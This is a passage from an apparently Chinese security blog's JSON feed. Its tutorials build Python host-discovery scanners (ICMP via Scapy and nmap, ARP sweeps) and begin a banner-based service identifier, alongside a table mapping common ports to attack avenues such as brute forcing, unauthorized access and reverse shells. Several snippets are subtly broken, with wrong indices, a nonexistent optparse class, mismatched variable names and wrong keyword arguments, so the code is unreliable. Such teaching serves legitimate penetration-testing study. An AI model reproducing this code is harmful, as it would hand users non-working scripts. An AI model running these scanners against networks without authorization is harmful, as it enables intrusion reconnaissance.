class=\"code\"><pre><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from random import randint</span><br><span class=\"line\">from optparse import OptionParser</span><br></pre></td></tr></table></figure></p>\n<p>对用户输入的参数进行接受和批量处理，并将处理后的 IP 地址传入 Scan 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt;&quot;)   #输出帮助信息</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,type=&#x27;string&#x27;,dest=&#x27;IP&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取IP参数</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    print(&quot;Scan report for&quot;+options.IP+&quot;\\n&quot;)</span><br><span class=\"line\">    #判断是单台主机还是多台主机</span><br><span class=\"line\">    #IP中存在-，说明是要扫描多台主机</span><br><span class=\"line\">    if &#x27;-&#x27; in options.IP:</span><br><span class=\"line\">    #代码举例：198.168.1.1-120</span><br><span class=\"line\">    #通过”-“进行分隔，把192.168.1.1和120分开</span><br><span class=\"line\">    #把192.168.1.1通过”,“进行分隔，取最后一个属作为range函数的start，然后把120+1作为range函数的stop</span><br><span class=\"line\">    #这样循环遍历出需要扫描的IP地址</span><br><span class=\"line\">        for i in range(int(options.IP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]),int(options.IP.split(&#x27;-&#x27;)[1])+1):</span><br><span class=\"line\">            Scan(</span><br><span class=\"line\">                options.IP.split(&#x27;.&#x27;)[0]+&#x27;.&#x27; +options.IP.split(&#x27;.&#x27;)[1]+&#x27;.&#x27;+options.IP.split(&#x27;.&#x27;)[2]+&#x27;.&#x27;+str(i)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            time.sleep(0.2)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        Scan(options.IP)</span><br><span class=\"line\">        </span><br><span class=\"line\">    print(&quot;\\nScan finished!...\\n&quot;)</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        main()</span><br><span class=\"line\">    except KeyboardInterrupt:</span><br><span class=\"line\">        print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>Scan 函数通过调用 ICMP，将构造好的请求包发送到目的地址，并根据目的地址的应答判断目标主机是否存活。存活的 IP 地址会打印出 &quot;xx.xx.xx.xx-&gt;Host<br />\nis up&quot;，对于不存活的主机打印出&quot;xx.xx.xx.xx-&gt;Host is down&quot;:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Scan(ip):</span><br><span class=\"line\">    ip_id = randint(1,65535)</span><br><span class=\"line\">    icmp_id = randint(1,65535)</span><br><span class=\"line\">    icmp_seq = randint(1,65535)</span><br><span class=\"line\">    packet=IP(dst=ip,ttl=64,id=ip_id)/ICMP(id=icmp_id,seq=icmp_seq)/b&#x27;rootkit&#x27;</span><br><span class=\"line\">    result = sr1(packet,timeout=1,verbose=False)</span><br><span class=\"line\">    if result:</span><br><span class=\"line\">        for rcv in result:</span><br><span class=\"line\">            scan_ip = rcv[IP].src</span><br><span class=\"line\">            print(scan_ip + &#x27;---&gt;&#x27; &#x27;Host is up&#x27;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(ip + &#x27;---&gt;&#x27; &#x27;Host is down&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p><strong>Nmap</strong></p>\n<p>此处，也可以导入 Nmap 库函数，实现探测主机存活工具的编写。这里使用 Nmap 函数的 - sn 与 - PE 参数，-PE 表示使用 ICMP，-sn 表示只测试该主机的状态</p>\n<p>首先导入代码所应用到的模块：nmap、optparse。nmap 模块用于产生 ICMP 的请求数据包，optparse 用于生成命令行参数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import nmap</span><br><span class=\"line\">import optparse</span><br></pre></td></tr></table></figure></p>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量处理，最后将处理后的 IP 地址传入 NmapScan 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = optparse.Optparse(&#x27;usage:python %prog -i ip \\n\\n&#x27;)</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,&#x27;--ip&#x27;,dest=&#x27;targetIP&#x27;,default=&#x27;192.168.1.1&#x27;,type=&#x27;string&#x27;,help=&#x27;target ip address&#x27;)</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    if &#x27;-&#x27; in options.targetIP:</span><br><span class=\"line\">        for i in range(int(options.IP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]), int(options.IP.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            NmapScan(</span><br><span class=\"line\">                options.IP.split(&#x27;.&#x27;)[0] + &#x27;.&#x27; + options.IP.split(&#x27;.&#x27;)[1] + &#x27;.&#x27; + options.IP.split(&#x27;.&#x27;)[2] + &#x27;.&#x27; + str(i)</span><br><span class=\"line\">            )</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        NmapScan(options.IP)</span><br></pre></td></tr></table></figure></p>\n<p>接下来就是处理 NmapScan 这个扫描判断函数了，因为要传入 - sn<br />\n-PE 参数，所以需要通过调用 nm.scan () 函数来实现，发起 ping 扫描，并打印出扫描之后的结果</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def NmapScan(targetIP):</span><br><span class=\"line\">    #实例化PortScanner对象</span><br><span class=\"line\">    nm = nmap.PortScanner()</span><br><span class=\"line\">    try:</span><br><span class=\"line\">#hosts为目标IP地址，arguments为Nmap的扫描参数</span><br><span class=\"line\">#-sn：使用ping进行扫描</span><br><span class=\"line\">#-PE：使用ICMP的echo请求包（-pp：使用timestamp请求包 -PM：netmask请求包）</span><br><span class=\"line\">        result = nm.scan(host=targetIP,argument=&#x27;-sn -PE&#x27;)</span><br><span class=\"line\">#对结果进行切片，提取主机状态信息</span><br><span class=\"line\">        state = result[&#x27;scan&#x27;][targetIP][&#x27;status&#x27;][&#x27;state&#x27;]</span><br><span class=\"line\">        print(&quot;[&#123;&#125;] is [&#123;&#125;]&quot;.format(targetIP,state))</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure></p>\n<p>最后，基于 ICMP 协议的主机探测、判断主机存活是一种很常见的方法，无论是以太网还是互联网都能使用。因此，当网络设备，如路由器、防火墙之类的对 ICMP 采取了限制策略，那就会影响到扫描结果，导致结果不准确。<br />\nNmap 模块实现的大体上的流程与使用 Scapy 差不多，相当于是把接受用户参数调用了 optparse 模块来实现，然后同样的遍历传入 NmapScan，再在 NmapScan 函数里面调用一个 nm.scan () 函数来传入 - sn<br />\n-PE 参数，就可以实现 ICMP 协议的实现和主机状态的探测功能</p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EARP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EARP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "title": "主动信息收集------基于ARP的主机发现",
            "date_published": "2024-04-16T05:58:19.066Z",
            "content_html": "<blockquote>\n<p>ARP 协议（地址解析协议）属于数据链路层的协议，主要负责根据网络层地址（IP）来获取数据链路层地址（MAC）<br />\n以太网协议规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须知道目标主机的 MAC 地址。而在 TCP/IP 中，网络层只关注目标主机的 IP 地址。这就导致在以太网中使用 IP 协议时，数据链路层的以太网协议接收到的网络层 IP 协议提供的数据中，只包含目标主机的 IP 地址。于是需要 ARP 协议来完成 IP 地址到 MAC 地址的转换</p>\n</blockquote>\n<p>这里假设一个以太网的结构图，如下图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/W62zPRJlNsUdVncU.png!thumbnail\" alt=\"\" /></p>\n<p>在这里假设 PC1 想和 PC3 进行通信，且知道了 PC3 的 IP 地址为 192.168.1.3，但是根据网络层的 IP 无法进行通信，根据以太网的协议规定，两台主机想要进行直接通信必须知道对方的 MAC 地址</p>\n<p>步骤如下：</p>\n<p>1.PC1 会检查自己的 ARP 缓存表中该 IP 是否有对应的 MAC 地址，若有可以直接进行通信</p>\n<p>2. 若无则 PC1 就会使用以太网广播包来给网络上的每一台主机发送 ARP 请求，询问 192.168.1.3 的 MAC 地址，同时 ARP 请求中也包含了 PC1 自己的 IP 地址和 MAC 地址，以太网内的所有主机都会接收到 ARP 请求，并检查是否与自己的 IP 地址相符合。如果不符合则丢弃该 ARP 请求</p>\n<p>3.PC3 确定 ARP 请求中的 IP 与自己的 IP 相符合后，就将 ARP 请求中的 PC1 的 IP 地址与 MAC 地址添加到本地的 ARP 缓存中</p>\n<p>4.PC3 将自己的 MAC 地址发送给 PC1</p>\n<p>5.PC1 收到 PC3 的 ARP 相应，将 PC3 的 IP 地址和 MAC 地址都更新到本地的 ARP 缓存中</p>\n<p>这样就可以进行直接通信了，用一个通俗点的方式来概括说明一下就是：</p>\n<blockquote>\n<p>你（PC1）知道了网友（PC3）的网名或者是 QQ 号（IP 地址），你们打算参加一个网友见面会来面基，在这个活动上你就拿着该网名（IP 地址）去挨个询问（发送 ARP 请求）参加的网友，看看谁是你想要面基的人，不认识的人就否认你的询问，直到问道了网友（PC3），他按照自己的网名知道了自己就是你想寻找的那个人，于是他就把你的网名和名字（MAC 地址）都对应记了下来，并且告诉你了他的名字，你也记下了他的名字，更新了备注<br />\n本地 ARP 缓存表是有生存周期的，生存周期结束后，就会再重复上面的过程</p>\n</blockquote>\n<p>当目标主机与我们共同处于一个以太网时，利用 ARP 进行主机发现是一个最好的选择，这种方式快且精准。同样的我们借助 Scapy 来编写 ARP 主机发现的脚本：</p>\n<blockquote>\n<p>通过脚本对以太网内的每个主机都进行 ARP 请求。若主机存活，则会响应我们的 ARP 请求，否则不会响应。因为 ARP 涉及到网络层和数据链路层，因此需要用到 Scapy 中的 Ether 和 ARP<br />\n 库中的 Eher 和 ARP 参数如下所示</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1IqnAJbXyaBYkwzW.png!thumbnail\" alt=\"\" /></p>\n<p>Ether 中的 dst 代表目标 MAC 地址，src 代表源 MAC 地址。ARP 中的 op 代表消息类型，1 为 ARP 请求，2 为 ARP 响应，hwsrc 和 psrc 分别代表源 MAC 地址和源 ip 地址，hwdst 和 pdst 分别代表的是目标 MAC 地址和目标 ip 地址</p>\n<p>导入模块</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br><span class=\"line\">import optparse</span><br><span class=\"line\">from scapy.all import *</span><br></pre></td></tr></table></figure></p>\n<p>编写本机 IP 地址和 MAC 地址获取函数，通过正则表达式来进行获取</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 取IP地址和MAC地址函数</span><br><span class=\"line\">def HostAddress(iface):</span><br><span class=\"line\">    # os.open执行后返回执行结果</span><br><span class=\"line\">    ipData = os.popen(&#x27;ifconfig&#x27; + iface)</span><br><span class=\"line\">    # 对ipData进行类型转换，再用正则进行匹配</span><br><span class=\"line\">    dataLine = ipData.readlines()</span><br><span class=\"line\">    # re.search利用正则匹配返回第一个成功匹配的结果，存在结果则为true</span><br><span class=\"line\">    # 取MAC地址</span><br><span class=\"line\">    if re.search(&#x27;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&#x27;, str(dataline)):</span><br><span class=\"line\">        # 取出匹配结果</span><br><span class=\"line\">        MAC = re.search(&#x27;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&#x27;, str(dataLine)).group(0)</span><br><span class=\"line\">    # 取ip地址</span><br><span class=\"line\">    if re.search(r&#x27;((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d)&#x27;, str(dataLine)):</span><br><span class=\"line\">        IP = re.search(r&#x27;((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d)&#x27;, str(dataLine)).group(0)</span><br><span class=\"line\">    # 将IP和MAC通过元组的形式返回</span><br><span class=\"line\">    addressInfo = (IP, MAC)</span><br><span class=\"line\">    return addressInfo</span><br></pre></td></tr></table></figure></p>\n<p>接着编写 ARP 探测函数，根据本机的 IP 地址和 MAC 地址信息，自动生成目标进行探测并把结果写入文件</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#ARP扫描函数</span><br><span class=\"line\">def ArpScan(iface=&#x27;eth0&#x27;):</span><br><span class=\"line\">    #通过HostAddress返回的元组取出MAC地址</span><br><span class=\"line\">    mac = HostAddress(iface)[1]</span><br><span class=\"line\">    #取出本机IP地址</span><br><span class=\"line\">    ip = HostAddress(iface)[0]</span><br><span class=\"line\">    #对本机IP地址进行分隔并作为一句元素，用于生成需要扫描的IP地址</span><br><span class=\"line\">    ipSplit = ip.split(&#x27;.&#x27;)</span><br><span class=\"line\">    #需要扫描的IP地址列表</span><br><span class=\"line\">    ipList = []</span><br><span class=\"line\">    #根据本机IP生成IP扫描范围</span><br><span class=\"line\">    for i in range(1,255):</span><br><span class=\"line\">        ipItem = ipSplit[0] + &#x27;.&#x27; + ipSplit[1] + &#x27;.&#x27; + ipSplit[2] + &#x27;.&#x27; + str(i)</span><br><span class=\"line\">        ipList.append(ipItem)</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    发送ARP包</span><br><span class=\"line\">    因为要用到OSI的二层和三层，所以要写成Rther/ARP</span><br><span class=\"line\">    因为最底层用到了二层，所以要用srp()发包</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    result = srp(Ether(src=mac,dst=&#x27;FF:FF:FF:FF:FF:FF&#x27;)/ARP(op=1,hwsrc=mac,hwdst=&#x27;00:00:00:00:00:00&#x27;,pdst=ipList),iface=iface,timeout=2,verbose=False)</span><br><span class=\"line\">    #读取result中的应答包和应答包内容</span><br><span class=\"line\">    resultAns = result[0].res</span><br><span class=\"line\">    #存活主机列表</span><br><span class=\"line\">    liveHost = []</span><br><span class=\"line\">    #number 为接收到应答包的总数</span><br><span class=\"line\">    number = len(resultAns)</span><br><span class=\"line\">    print(&quot;=========================&quot;)</span><br><span class=\"line\">    print(&quot;ARP探测结果&quot;)</span><br><span class=\"line\">    print(&quot;本机ip地址：&quot;+ip)</span><br><span class=\"line\">    print(&quot;本机mac地址：&quot;+mac)</span><br><span class=\"line\">    print(&quot;=========================&quot;)</span><br><span class=\"line\">    for x in range(number):</span><br><span class=\"line\">        IP = resultAns[x][1][1].fields[&#x27;psrc&#x27;]</span><br><span class=\"line\">        MAC = resultAns[x][1][1].fields[&#x27;hwsrc&#x27;]</span><br><span class=\"line\">        liveHost.append([IP,MAC])</span><br><span class=\"line\">        print(&quot;IP:&quot;+IP+&quot;\\n\\n&quot;+&quot;MAC:&quot;+MAC)</span><br><span class=\"line\">        print(&quot;============================&quot;)</span><br><span class=\"line\">    #把存活主机IP写入文件</span><br><span class=\"line\">    resultFile = open(&quot;result&quot;,&quot;w&quot;)</span><br><span class=\"line\">    for i in range(len(liveHost)):</span><br><span class=\"line\">        resultFile.write(liveHost[i][0]+&quot;\\n&quot;)</span><br><span class=\"line\">    resultFile.close()</span><br></pre></td></tr></table></figure></p>\n<p>编写 main 函数，利用 optparse 模块生成命令行参数化形式</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = optparse.OptionParser(&#x27;usage:python %prog -i interfaces \\n\\n&#x27;&#x27;Example:python %prog -i eth0\\n&#x27;)</span><br><span class=\"line\">    #添加网卡参数</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,&#x27;--iface&#x27;,dest = &#x27;iface&#x27;,default=&#x27;eth0&#x27;,type=&#x27;string&#x27;,help=&#x27;interfaces name&#x27;)</span><br><span class=\"line\">    (options,args) = parser.parse_args()</span><br><span class=\"line\">    ArpScan(options.iface)</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>提示：普通用户运行时需要 sudo，不然会出现 Operation not permitted 的提醒</p>\n</blockquote>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB/",
            "title": "主动信息收集------服务识别",
            "date_published": "2024-04-16T05:58:19.064Z",
            "content_html": "<blockquote>\n<p>在渗透测试的过程中，服务识别是一个很重要的环节，如果能识别出目标主机的服务、版本等信息，对于渗透测试将有重要帮助。对于入侵者来说，发现这些运行在目标上的服务，就可以利用这些软件上的漏洞入侵目标；对于网络安全的维护者来说，也可以提前发现系统的漏洞，从而预防这些入侵行为<br />\n很多的扫描工具都是采用了一种十分简单的方式，就是根据端口号来判断服务的类型，因为通常很多常见的服务都会运行在固定的端口上，如下表</p>\n</blockquote>\n<p>端口号     说明                   作用</p>\n<hr />\n<p>21/22/69   FTP/TFTP               允许匿名上传、下载、破解和嗅探攻击<br />\n 2049       NFS 服务                配置不当<br />\n 139        Samba 服务              破解、未授权访问、远程代码执行<br />\n 389        LDAP（目录访问协议）   注入、允许匿名访问、使用弱口令</p>\n<p>文件共享服务端口</p>\n<p>端口号   说明              作用</p>\n<hr />\n<p>22       SSH 远程连接       破解、SSH 隧道以及内网代理转发，文件传输<br />\n 23       Telnet 远程连接    破解、嗅探、弱口令<br />\n 3389     Rdp 远程桌面连接   Shift 后门（需要 Windows Server 2003 以下的系统）、破解<br />\n 5900     VNC               弱口令破解<br />\n 5632     PyAnywhere        抓密码、代码执行</p>\n<p>远程连接服务端口</p>\n<p>端口号        说明                        作用</p>\n<hr />\n<p>80/443/8080   常见 Web 服务端口             Web 攻击、破解、服务器版本漏洞<br />\n 7001/7002     WebLogic 控制台              Java 反序列化、弱口令<br />\n 8080/8089     Jboss/Resin/Jetty/JenKins   反序列化、控制台弱口令<br />\n 9090          WebSphere 控制台             Java 反序列化、弱口令<br />\n 4848          GlassFish 控制台             弱口令<br />\n 1352          Lotus Domino 邮件服务        弱口令、信息泄露、破解<br />\n 10000         Webmin-Web 控制面板          弱口令</p>\n<p>Web 应用服务端口</p>\n<p>端口号        说明               作用</p>\n<hr />\n<p>3306          MySOL              注入、提权、破解<br />\n 1433          MSSQL              注入、提权、SA 弱口令、破解<br />\n 1521          Oracle 数据库       TNS 破解、注入、反弹 shell<br />\n5432          PostgreSQL 数据库   破解、注入、弱口令<br />\n 27017/27018   MongoDB            破解、未授权访问<br />\n 6379          Redis 数据库        可尝试未授权访问、弱口令破解<br />\n 5000          SysBase/DB2        破解、注入</p>\n<p>数据库服务端口</p>\n<p>端口号   说明           作用</p>\n<hr />\n<p>25       SMTP 邮件服务   邮件伪造<br />\n 110      POP3 协议       破解、嗅探<br />\n 143      IMAP 协议       破解、收集目标内网信息</p>\n<p>邮件服务端口</p>\n<p>端口号   说明          作用</p>\n<hr />\n<p>53       DNS 域名系统   允许区域传送、DNS 劫持、缓存投毒、欺骗<br />\n 67/68    DHCP 服务      劫持、欺骗<br />\n 161      SNMP 协议      破解、搜集目标内网信息</p>\n<p>网络常见协议端口</p>\n<p>端口号        说明                     作用</p>\n<hr />\n<p>2181          Zookeeper 服务            未授权访问<br />\n 8096          Zabbix 服务               远程执行、SQL 注入<br />\n 9200/9300     Elasticsearch            远程执行<br />\n 11211         Memcache                 未授权访问<br />\n 512/513/514   Linux Rexec 服务          破解、Rlogin 登录<br />\n 873           Rsync 服务                匿名访问、文件上传<br />\n 3690          SVN 服务                  SVN 泄露、未授权访问<br />\n 50000         SAP Management Console   远程执行</p>\n<p>特殊服务端口</p>\n<p>而对端口的服务进行探测的方法就是向目标开放的端口发送探针数据包，根据目标主机返回的 banner 信息与已经存储总结的 banner 信息进行对比，进而确认服务类型。而强大的 Nmap 也是利用了这种方法，它有一个十分强大的 banner 库，这个库也还在不断的完善当中</p>\n<p>根据这个特性与方法，就可以来编写扫描端口服务类型的程序了</p>\n<p>先导入所需要用到的模块，time 用于模块主要用于产生延迟时间，optparse 模块用于生成命令行参数，socket 模块用于产生 TCP 请求，re 模块为正则表达式模块，与指纹信息进行有效匹配，进而确定服务类型。SIGNS 为指纹库用于对目标主机返回的 banner 信息进行匹配，读者可自行添加扩展</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">import time</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">SIGNS = (</span><br><span class=\"line\">    #协议|版本|关键字</span><br><span class=\"line\">    b&#x27;FTP|FTP|^220.*FTP&#x27;,</span><br><span class=\"line\">    b&#x27;MySQL|MySQL|mysql_native_password&#x27;,</span><br><span class=\"line\">    b&#x27;oracle-https|^220- ora&#x27;,</span><br><span class=\"line\">    b&#x27;Telnet|Telnet|Telnet&#x27;,</span><br><span class=\"line\">    b&#x27;Telnet|Telnet|^\\r\\n%connection closed by remote host!\\x00$&#x27;,</span><br><span class=\"line\">    b&#x27;VNC|VNC|^RFB&#x27;,</span><br><span class=\"line\">    b&#x27;IMAP|IMAP|^\\* OK.*?IMAP&#x27;,</span><br><span class=\"line\">    b&#x27;POP|POP|^\\+OK.*?&#x27;,</span><br><span class=\"line\">    b&#x27;SMTP|SMTP|^220.*?SMTP&#x27;,</span><br><span class=\"line\">    b&#x27;Kangle|Kangle|HTTP.*kangle&#x27;,</span><br><span class=\"line\">    b&#x27;SMTP|SMTP|^554 SMTP&#x27;,</span><br><span class=\"line\">    b&#x27;SSH|SSH|^SSH-&#x27;,</span><br><span class=\"line\">    b&#x27;HTTPS|HTTPS|Location:https&#x27;,</span><br><span class=\"line\">    b&#x27;HTTP|HTTP|HTTP/1.1&#x27;,</span><br><span class=\"line\">    b&#x27;HTTP|HTTP|HTTP/1.0&#x27;,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量的处理，最后将处理后的 IP 地址及端口 port 传入 request () 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt;&quot;)#输出帮助信息</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,type=&#x27;string&#x27;,dest=&#x27;IP&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取IP地址参数</span><br><span class=\"line\">    parser.add_option(&#x27;-p&#x27;,type=&#x27;string&#x27;,dest=&#x27;PORT&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取端口参数</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    ip = options.IP</span><br><span class=\"line\">    port = options.PORT</span><br><span class=\"line\">    